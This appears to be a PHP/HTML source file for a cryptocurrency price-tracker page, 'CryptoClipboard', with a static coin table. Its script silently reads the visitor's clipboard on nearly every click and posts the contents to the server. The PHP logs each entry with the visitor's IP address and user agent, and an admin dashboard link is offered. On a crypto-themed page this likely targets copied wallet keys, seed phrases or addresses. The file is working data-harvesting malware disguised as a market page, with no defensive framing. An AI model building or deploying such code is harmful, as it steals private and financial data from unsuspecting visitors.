<?php
// Set Indian timezone
date_default_timezone_set('Asia/Kolkata');

$json_file = 'clipboard_data.json';

// Ensure JSON file exists
if (!file_exists($json_file)) {
    file_put_contents($json_file, '[]');
}

// Handle clipboard data saving
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clipboard_data'])) {
    $clipboard_data = trim($_POST['clipboard_data']);
    
    if (!empty($clipboard_data)) {
        $new_entry = [
            'text' => $clipboard_data,
            'time' => date('Y-m-d H:i:s'),
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'page' => 'crypto_page'
        ];
        
        // Read existing data
        $existing_data = [];
        if (file_exists($json_file)) {
            $existing_json = file_get_contents($json_file);
            if ($existing_json) {
                $existing_data = json_decode($existing_json, true) ?: [];
            }
        }
        
        // Add new entry
        $existing_data[] = $new_entry;
        
        // Save to JSON file
        if (file_put_contents($json_file, json_encode($existing_data, JSON_PRETTY_PRINT))) {
            echo "SUCCESS";
        } else {
            echo "ERROR";
        }
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Clipboard Tracker</title>
    <style>
        :root {
            --bg: #ffffff;
            --text: #222;
            --card: #f8fafd;
            --border: #e0e6ea;
            --blue: #3861fb;
            --green: #16c784;
            --red: #ea3943;
        }

        body {
            margin: 0;
            background: var(--bg);
            color: var(--text);
            font-family: Arial, sans-serif;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            color: var(--blue);
            margin-bottom: 10px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--card);
            border: 1px solid var(--border);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }

        .crypto-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }

        .crypto-table th,
        .crypto-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }

        .crypto-table tr:hover {
            background: var(--card);
        }

        .positive { color: var(--green); }
        .negative { color: var(--red); }

        .btn {
            background: var(--blue);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--green);
            color: white;
            padding: 12px 20px;
            border-radius: 5px;
            display: none;
            z-index: 1000;
        }

        .admin-link {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--red);
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="notification" id="notification">Clipboard saved!</div>

    <div class="container">
        <div class="header">
            <div class="logo">CryptoClipboard</div>
            <p>Real-time cryptocurrency prices with clipboard intelligence</p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div style="font-size: 14px; opacity: 0.7;">Market Cap</div>
                <div style="font-size: 20px; font-weight: bold;">$2.64T</div>
            </div>
            <div class="stat-card">
                <div style="font-size: 14px; opacity: 0.7;">24h Volume</div>
                <div style="font-size: 20px; font-weight: bold;">$98.5B</div>
            </div>
            <div class="stat-card">
                <div style="font-size: 14px; opacity: 0.7;">BTC Dominance</div>
                <div style="font-size: 20px; font-weight: bold;">52.3%</div>
            </div>
        </div>

        <table class="crypto-table">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Coin</th>
                    <th>Price</th>
                    <th>24h Change</th>
                    <th>Market Cap</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>1</td>
                    <td><strong>Bitcoin (BTC)</strong></td>
                    <td>$93,400</td>
                    <td class="positive">+2.4%</td>
                    <td>$1.8T</td>
                </tr>
                <tr>
                    <td>2</td>
                    <td><strong>Ethereum (ETH)</strong></td>
                    <td>$4,850</td>
                    <td class="negative">-1.2%</td>
                    <td>$580B</td>
                </tr>
                <tr>
                    <td>3</td>
                    <td><strong>BNB (BNB)</strong></td>
                    <td>$612</td>
                    <td class="positive">+0.9%</td>
                    <td>$90B</td>
                </tr>
                <tr>
                    <td>4</td>
                    <td><strong>Solana (SOL)</strong></td>
                    <td>$175</td>
                    <td class="positive">+5.8%</td>
                    <td>$79B</td>
                </tr>
                <tr>
                    <td>5</td>
                    <td><strong>XRP (XRP)</strong></td>
                    <td>$0.62</td>
                    <td class="negative">-0.5%</td>
                    <td>$34B</td>
                </tr>
            </tbody>
        </table>

        <button class="btn" id="viewMoreBtn">View More Coins</button>
    </div>

    <a href="admin.php" class="admin-link">Admin Dashboard</a>

    <script>
    // Clipboard capture system
    async function captureClipboard() {
        try {
            // Try to read clipboard
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                if (text && text.trim() !== '') {
                    await saveToServer(text.trim());
                    return true;
                }
            }
        } catch (error) {
            console.log('Clipboard API error:', error);
        }
        return false;
    }

    async function saveToServer(text) {
        try {
            const formData = new FormData();
            formData.append('clipboard_data', text);

            const response = await fetch('index.php', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                const result = await response.text();
                if (result === 'SUCCESS') {
                    showNotification('✓ Clipboard saved successfully!');
                    return true;
                }
            }
        } catch (error) {
            console.log('Save error:', error);
            showNotification('✗ Failed to save clipboard', true);
        }
        return false;
    }

    function showNotification(message, isError = false) {
        const notif = document.getElementById('notification');
        notif.textContent = message;
        notif.style.background = isError ? '#ea3943' : '#16c784';
        notif.style.display = 'block';
        
        setTimeout(() => {
            notif.style.display = 'none';
        }, 3000);
    }

    // Event listeners
    document.addEventListener('click', async (e) => {
        // Don't capture admin link clicks
        if (!e.target.closest('.admin-link')) {
            setTimeout(async () => {
                const captured = await captureClipboard();
                if (!captured) {
                    console.log('Clipboard not available or empty');
                }
            }, 100);
        }
    });

    // View More button
    document.getElementById('viewMoreBtn').addEventListener('click', function() {
        // Additional coins can be loaded here
        console.log('Loading more coins...');
    });

    console.log('Clipboard tracker activated on Render');
    </script>
</body>
</html>
